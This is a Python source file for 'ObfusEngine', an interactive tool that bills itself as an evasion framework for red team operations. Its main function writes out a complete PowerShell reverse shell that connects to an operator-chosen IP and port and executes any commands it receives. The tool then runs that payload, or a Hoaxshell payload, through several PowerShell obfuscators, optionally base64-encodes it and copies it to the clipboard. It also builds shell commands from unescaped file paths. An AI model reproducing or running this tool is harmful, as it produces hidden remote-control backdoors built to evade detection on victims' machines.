#!/usr/bin/env python3
import os
import sys
import base64
import argparse
from pathlib import Path
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
from rich.table import Table
from rich.prompt import Prompt, Confirm
from rich.tree import Tree
from rich.align import Align
from rich.text import Text
from rich.layout import Layout
from rich.columns import Columns
import subprocess
import shutil
import time
import pyperclip

class ObfuscationTool:
    def __init__(self):
        self.console = Console()
        self.techniques_info = {
            'invoke': {
                'name': 'Invoke-PSObfuscation',
                'description': 'PowerShell cmdlets, comments, and variable obfuscation',
                'type': 'PowerShell',
                'file': 'Invoke-PSObfuscation.ps1'
            },
            'xencrypt': {
                'name': 'BetterXencrypt',
                'description': 'Advanced PowerShell encryption and obfuscation',
                'type': 'PowerShell',
                'file': 'BetterXencrypt.ps1'
            },
            'chameleon': {
                'name': 'Chameleon',
                'description': 'Multi-layer PowerShell obfuscation with random backticks',
                'type': 'PowerShell',
                'file': 'chameleon.py'
            },
            'pyfuscation': {
                'name': 'PyFuscation',
                'description': 'Python-based PowerShell script obfuscation',
                'type': 'PowerShell',
                'file': 'PyFuscation.py'
            }
        }

    def show_banner(self):
        banner_text = """
   ██████╗ ██████╗ ███████╗██╗   ██╗███████╗███████╗███╗   ██╗ ██████╗ ██╗███╗   ██╗███████╗
  ██╔═══██╗██╔══██╗██╔════╝██║   ██║██╔════╝██╔════╝████╗  ██║██╔════╝ ██║████╗  ██║██╔════╝
  ██║   ██║██████╔╝█████╗  ██║   ██║███████╗█████╗  ██╔██╗ ██║██║  ███╗██║██╔██╗ ██║█████╗
  ██║   ██║██╔══██╗██╔══╝  ██║   ██║╚════██║██╔══╝  ██║╚██╗██║██║   ██║██║██║╚██╗██║██╔══╝
  ╚██████╔╝██████╔╝██║     ╚██████╔╝███████║███████╗██║ ╚████║╚██████╔╝██║██║ ╚████║███████╗
   ╚═════╝ ╚═════╝ ╚═╝      ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚══════╝
        """
        
        banner_text_obj = Text(banner_text, style="bold cyan")
        banner_text_obj.append("\n\n")
        banner_text_obj.append("Version: ", style="bold white")
        banner_text_obj.append("v1.0.0", style="bold green")
        banner_text_obj.append(" | Author: ", style="bold white")
        banner_text_obj.append("Vibhas Dutta", style="bold cyan")
        banner_text_obj.append(" | GitHub: ", style="bold white")
        banner_text_obj.append("https://github.com/vibhasdutta/ObfusEngine", style="bold blue underline")
        
        panel = Panel(
            Align.center(banner_text_obj),
            title="[bold red]🔒 ObfusEngine - Advanced Script Obfuscation Engine 🔒[/]",
            subtitle="[dim]Modular Evasion Framework for Red Team Operations[/]",
            border_style="bright_blue",
            padding=(1, 2)
        )
        self.console.print(panel)
        self.console.print()

    def show_techniques_menu(self):
        #Display available obfuscation techniques in a table
        table = Table(title="🛠️  Available Obfuscation Techniques", show_header=True, header_style="bold magenta")
        table.add_column("ID", style="cyan", no_wrap=True)
        table.add_column("Technique", style="green")
        table.add_column("Type", style="yellow")
        table.add_column("Description", style="white")
        
        for key, info in self.techniques_info.items():
            table.add_row(
                key,
                info['name'],
                info['type'],
                info['description']
            )
        
        table.add_row("all", "All Techniques", "Combined", "Run all available techniques sequentially")
        
        self.console.print(table)
        self.console.print()

    def get_clipboard_content(self):
        """Get script content from clipboard"""
        try:
            clipboard_content = pyperclip.paste()
            if not clipboard_content.strip():
                self.console.print("[red]❌ Clipboard is empty![/]")
                return None
            
            self.console.print(f"[green]✅ Retrieved {len(clipboard_content)} characters from clipboard[/]")
            return clipboard_content
        except Exception as e:
            self.console.print(f"[red]❌ Error accessing clipboard: {e}[/]")
            return None

    def interactive_mode(self):
        self.show_banner()
        
        # Step 1: Choose input method
        self.console.print("[bold blue]Step 1:[/] Choose your script source")
        self.console.print("[dim]This tool can generate scripts from scratch or obfuscate existing ones[/]")
        
        # Add clipboard option to choices
        input_choice = Prompt.ask(
            "Do you want to use",
            choices=["custom", "generate", "clipboard"],
            default="generate"
        )
        
        args = argparse.Namespace()
        
        if input_choice == "custom":
            while True:
                script_path = Prompt.ask("[green]📁 Enter path to your custom script file[/]")
                if Path(script_path).exists():
                    args.input_script = script_path
                    args.hxshell = False
                    self.console.print(f"[green]✅ Custom script loaded: {script_path}[/]")
                    break
                else:
                    self.console.print("[red]❌ File not found. Please try again.[/]")
        elif input_choice == "clipboard":
            self.console.print("[cyan]📋 Using clipboard content as input script...[/]")
            args.hxshell = True
            args.input_script = None
        else:
            self.console.print("[cyan]🔧 Generating a reverse shell script for you...[/]")
            args.ip = Prompt.ask("[green]🎯 Enter target IP address[/]")
            args.port = int(Prompt.ask("[green]🔌 Enter target port[/]", default="4444"))
            args.input_script = None
            args.hxshell = False
            self.console.print(f"[green]✅ Will generate reverse shell: {args.ip}:{args.port}[/]")
        
        # Step 2: Choose techniques
        self.console.print("\n[bold blue]Step 2:[/] Select obfuscation techniques")
        self.show_techniques_menu()
        
        techniques = Prompt.ask(
            "[green]Enter techniques (comma-separated) or 'all'[/]",
            default="invoke"
        )
        args.technique = techniques
        
        # Step 3: Output settings
        self.console.print("\n[bold blue]Step 3:[/] Output configuration")
        args.output_name = Prompt.ask("[green]Output filename[/]", default="obfuscated.ps1")
        args.encode = Confirm.ask("[green]Base64 encode the output?[/]", default=False)
        args.view = Confirm.ask("[green]Show script contents after obfuscation?[/]", default=True)
        
        # Set other defaults
        args.directory = str(Path.cwd())
        
        return args

    def validate_environment(self, base_dir):
        #Check if required obfuscation tools are available
        self.console.print("[bold blue]🔍 Validating Environment...[/]")
        
        validation_table = Table(title="Environment Validation", show_header=True)
        validation_table.add_column("Tool", style="cyan")
        validation_table.add_column("Status", style="white")
        validation_table.add_column("Path", style="dim")
        
        tools_status = {}
        
        # Check each technique
        for key, info in self.techniques_info.items():
            if key == 'invoke':
                path = base_dir / "Obfuscation_Technique" / info['file']
            elif key == 'xencrypt':
                path = base_dir / "Obfuscation_Technique" / info['file']
            elif key == 'chameleon':
                path = base_dir / "Obfuscation_Technique" / "Chameleon" / info['file']
            elif key == 'pyfuscation':
                path = base_dir / "Obfuscation_Technique" / "PyFuscation" / info['file']
            
            status = "✅ Available" if path.exists() else "❌ Missing"
            tools_status[key] = path.exists()
            validation_table.add_row(info['name'], status, str(path))
        
        self.console.print(validation_table)
        
        missing_tools = [k for k, v in tools_status.items() if not v]
        if missing_tools:
            self.console.print(f"\n[bold red]⚠️  Warning: Missing tools: {', '.join(missing_tools)}[/]")
            if not Confirm.ask("Continue anyway?", default=False):
                sys.exit(1)
        else:
            self.console.print("\n[bold green]✅ All tools are available![/]")
        
        self.console.print()

    def obfuscate_script(self, args, input_script, workspace, base_dir):
        #Enhanced obfuscation with progress tracking
        output_script = workspace / args.output_name
        techniques = [t.strip().lower() for t in args.technique.split(',')]
        
        if 'all' in techniques:
            techniques = list(self.techniques_info.keys())
        
        self.console.print(f"[bold green]🎯 Target Script:[/] {input_script}")
        self.console.print(f"[bold green]📁 Output Location:[/] {output_script}")
        self.console.print(f"[bold green]🔧 Techniques:[/] {', '.join(techniques)}\n")
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TaskProgressColumn(),
            console=self.console
        ) as progress:
            
            main_task = progress.add_task("Overall Progress", total=len(techniques))
            
            for i, technique in enumerate(techniques):
                if technique not in self.techniques_info:
                    self.console.print(f"[red]❌ Unknown technique: {technique}[/]")
                    continue
                
                technique_task = progress.add_task(
                    f"Running {self.techniques_info[technique]['name']}", 
                    total=100
                )
                
                # Simulate progress for demonstration
                for step in range(0, 101, 20):
                    progress.update(technique_task, completed=step)
                    time.sleep(0.1)
                
                success = self._run_technique(technique, input_script, output_script, base_dir)
                
                if success:
                    progress.update(technique_task, completed=100)
                    self.console.print(f"[green]✅ {self.techniques_info[technique]['name']} completed[/]")
                else:
                    self.console.print(f"[red]❌ {self.techniques_info[technique]['name']} failed[/]")
                
                progress.update(main_task, advance=1)
                
                # Update input for next technique (chaining)
                if success and output_script.exists():
                    input_script = output_script
        
        return output_script.exists()

    def _run_technique(self, technique, input_script, output_script, base_dir):
        #Run individual obfuscation technique
        try:
            if technique == "invoke":
                invoke_module = base_dir / "Obfuscation_Technique" / "Invoke-PSObfuscation.ps1"
                if invoke_module.exists():
                    cmd = (
                        f"pwsh -Command \"Import-Module '{invoke_module}'; "
                        f"Invoke-PSObfuscation -Path '{input_script}' -Cmdlets -Comments -NamespaceClasses -Variables -OutFile '{output_script}'\""
                    )
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    return result.returncode == 0
                return False

            elif technique == "xencrypt":
                betterx_path = base_dir / "Obfuscation_Technique" / "BetterXencrypt.ps1"
                if betterx_path.exists():
                    cmd = (
                        f"pwsh -Command \"Import-Module '{betterx_path}'; "
                        f"Invoke-BetterXencrypt -InFile '{input_script}' "
                        f"-OutFile '{output_script}' -Iterations 10\""
                    )
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    return result.returncode == 0
                return False

            elif technique == "chameleon":
                chameleon = base_dir / "Obfuscation_Technique" / "Chameleon" / "chameleon.py"
                if chameleon.exists():
                    cmd = f"python3 '{chameleon}' '{input_script}' -o '{output_script}' -a -l 3 --random-backticks"
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    return result.returncode == 0
                return False

            elif technique == "pyfuscation":
                pyfuscation = base_dir / "Obfuscation_Technique" / "PyFuscation" / "PyFuscation.py"
                tmp_dir = base_dir / "Obfuscation_Technique" / "PyFuscation" / "tmp"

                if pyfuscation.exists():
                    cmd = f"python3 '{pyfuscation}' -fvp --ps '{input_script}'"
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                    
                    output_file = tmp_dir / "script.ps1"
                    if output_file.exists():
                        obf_text = output_file.read_text()
                        output_script.write_text(obf_text)
                        
                        if tmp_dir.exists():
                            try:
                                shutil.rmtree(tmp_dir)
                            except Exception:
                                pass
                        return True
                return False
                
        except Exception as e:
            self.console.print(f"[red]Error running {technique}: {e}[/]")
            return False

    def show_results(self, args, input_script, workspace):
        #Display results with enhanced formatting
        output_script = workspace / args.output_name
        
        results_panel = Panel.fit(
            Align.center("[bold green]🎉 ObfusEngine - Obfuscation Complete! 🎉[/]"),
            style="green"
        )
        self.console.print(results_panel)
        
        # Results summary
        summary_table = Table(title="📊 Results Summary", show_header=True)
        summary_table.add_column("Property", style="cyan")
        summary_table.add_column("Value", style="white")
        
        if output_script.exists():
            if isinstance(input_script, Path) and input_script.exists():
                original_size = input_script.stat().st_size
            else:
                original_size = len(str(input_script)) if input_script else 0
            
            obfuscated_size = output_script.stat().st_size
            
            summary_table.add_row("Original Size", f"{original_size:,} bytes")
            summary_table.add_row("Obfuscated Size", f"{obfuscated_size:,} bytes")
            summary_table.add_row("Size Ratio", f"{obfuscated_size/max(original_size, 1):.2f}x")
            summary_table.add_row("Output File", str(output_script))
            
            if args.encode:
                encoded_path = workspace / f"{Path(args.output_name).stem}_base64.txt"
                summary_table.add_row("Encoded File", str(encoded_path))
        
        self.console.print(summary_table)
        
        if args.view and output_script.exists():
            self.show_script_comparison(input_script, output_script, workspace, args)
        self.console.print("\n[bold orange]📋 Script is copied to Clipboard!![/]")
        obfuscated_content = output_script.read_text()
        pyperclip.copy(obfuscated_content)

    def show_script_comparison(self, input_script, output_script, workspace, args):
        #Show side-by-side script comparison
        self.console.print("\n[bold blue]📋 Script Comparison[/]")
        
        # Original script
        if isinstance(input_script, Path) and input_script.exists():
            original_content = input_script.read_text()[:500] + "..." if len(input_script.read_text()) > 500 else input_script.read_text()
        else:
            original_content = str(input_script)[:500] + "..." if len(str(input_script)) > 500 else str(input_script)
        
        # Obfuscated script
        obfuscated_content = output_script.read_text()
        if len(obfuscated_content) > 500:
            obfuscated_content = obfuscated_content[:500] + "..."
        
        # Create side-by-side panels
        original_panel = Panel(
            original_content,
            title="[bold green]Original Script[/]",
            border_style="green"
        )
        
        obfuscated_panel = Panel(
            obfuscated_content,
            title="[bold red]Obfuscated Script[/]",
            border_style="red"
        )
        
        columns = Columns([original_panel, obfuscated_panel], equal=True)
        self.console.print(columns)
        
        if args.encode:
            encoded_path = workspace / f"{Path(args.output_name).stem}_base64.txt"
            if encoded_path.exists():
                self.console.print(f"\n[bold cyan]🔐 Base64 Encoded Version:[/]")
                encoded_content = encoded_path.read_text()
                if len(encoded_content) > 200:
                    encoded_content = encoded_content[:200] + "..."
                
                encoded_panel = Panel(
                    encoded_content,
                    title="[bold yellow]Base64 Encoded[/]",
                    border_style="yellow"
                )
                self.console.print(encoded_panel)

def setup_argparse():
    parser = argparse.ArgumentParser(
        description="🔒 ObfusEngine v1.0.0 - Advanced Script Obfuscation Engine\nGenerates and obfuscates scripts for red team operations\n\nAuthor: Vibhas Dutta\nGitHub: https://github.com/vibhasdutta/ObfusEngine",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s                                         # Interactive mode (default)
  %(prog)s -i 192.168.1.10 -p 4444 -t all        # Generate & obfuscate reverse shell
  %(prog)s -I script.ps1 -t invoke,chameleon      # Obfuscate existing script  
  %(prog)s --hxshell -t all -e                    # Use Hoaxshell Payload content with all techniques
  %(prog)s -I payload.py -t pyfuscation -e -v     # Obfuscate with encoding and view

Note: Interactive mode launches automatically when sufficient arguments aren't provided.

Report bugs: https://github.com/vibhasdutta/ObfusEngine/issues
        """
    )
    
    # Input options
    input_group = parser.add_argument_group('Input Options')
    input_group.add_argument("-I", "--input-script", help="Path to existing script (PowerShell or Python)")
    input_group.add_argument("-i", "--ip", help="Target IP address for generated reverse shell")
    input_group.add_argument("-p", "--port", type=int, help="Target port number for reverse shell")
    input_group.add_argument("--hxshell", action="store_true", help="Use Hoaxshell Payload as input script")
    
    # Obfuscation options
    obf_group = parser.add_argument_group('Obfuscation Options')
    obf_group.add_argument("-t", "--technique", help="Comma-separated techniques: invoke,xencrypt,chameleon,pyfuscation,all")
    obf_group.add_argument("--version", action="version", version="ObfusEngine v1.0.0")
    
    # Output options
    output_group = parser.add_argument_group('Output Options')
    output_group.add_argument("-d", "--directory", default=str(Path.cwd()), help="Working directory")
    output_group.add_argument("-oN", "--output-name", default="obfuscated.ps1", help="Output filename")
    output_group.add_argument("-e", "--encode", action="store_true", help="Base64 encode the output")
    output_group.add_argument("-v", "--view", action="store_true", help="Show script contents verbosely")
    
    return parser.parse_args()

def main():
    tool = ObfuscationTool()
    args = setup_argparse()
    
    # Interactive mode is now default - only skip if specific args provided
    if not (args.technique and (args.input_script or args.hxshell or (args.ip and args.port))):
        args = tool.interactive_mode()
    
    # Validation - modified to handle hxshell case
    if not args.input_script and not args.hxshell and not (args.ip and args.port):
        tool.console.print("[bold red]❌ Error: Configuration incomplete[/]")
        tool.console.print("[yellow]💡 Tip: Run without arguments to use interactive mode[/]")
        sys.exit(1)
    
    if not args.technique:
        tool.console.print("[bold red]❌ Error: Technique parameter is required[/]")
        sys.exit(1)
    
    # Setup directories
    base_dir = Path(args.directory).resolve()
    workspace = base_dir / "ObfusWorkspace"
    workspace.mkdir(parents=True, exist_ok=True)
    
    # Validate environment
    tool.validate_environment(base_dir)
    
    # Prepare input script
    if args.hxshell:
        # Use clipboard content
        tool.console.print("[bold cyan]📋 HxShell Mode: Reading script from clipboard...[/]")
        clipboard_content = tool.get_clipboard_content()
        
        if not clipboard_content:
            tool.console.print("[red]❌ Error: Could not retrieve script from clipboard[/]")
            sys.exit(1)
        
        input_script = workspace / "clipboard_script.ps1"
        input_script.write_text(clipboard_content)
        tool.console.print(f"[green]✅ Script from clipboard saved to temporary file[/]")
        
    elif args.input_script:
        input_script = Path(args.input_script).resolve()
        if not input_script.exists():
            tool.console.print(f"[red]❌ Error: Input script not found at {input_script}[/]")
            sys.exit(1)
        tool.console.print(f"[green]✅ Using custom script: {input_script}[/]")
    else:
        # Auto-generate reverse shell
        ps_script = f'''$LHOST = "{args.ip}"; $LPORT = {args.port}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) {{ while ($NetworkStream.DataAvailable) {{ $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }}; if ($TCPClient.Connected -and $Code.Length -gt 1) {{ $Output = try {{ Invoke-Expression ($Code) 2>&1 }} catch {{ $_ }}; $StreamWriter.Write("$Output`n"); $Code = $null }} }}; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()'''
        input_script = workspace / "reverse_shell.ps1"
        input_script.write_text(ps_script)
        tool.console.print(f"[green]✅ Auto-generated reverse shell script[/]")
    
    # Run obfuscation
    tool.console.print(Panel.fit("🚀 Starting Obfuscation Process", style="bold blue"))
    success = tool.obfuscate_script(args, input_script, workspace, base_dir)
    
    if success:
        # Handle base64 encoding
        if args.encode:
            output_script = workspace / args.output_name
            encoded_path = workspace / f"{Path(args.output_name).stem}_base64.txt"
            with open(output_script, "rb") as f:
                encoded_data = base64.b64encode(f.read()).decode()
            encoded_path.write_text(encoded_data)
            tool.console.print(f"[cyan]🔐 Base64 encoded output saved[/]")
        
        # Show results
        tool.show_results(args, input_script, workspace)
    else:
        tool.console.print("[red]❌ Obfuscation failed![/]")
        sys.exit(1)

if __name__ == "__main__":
    main()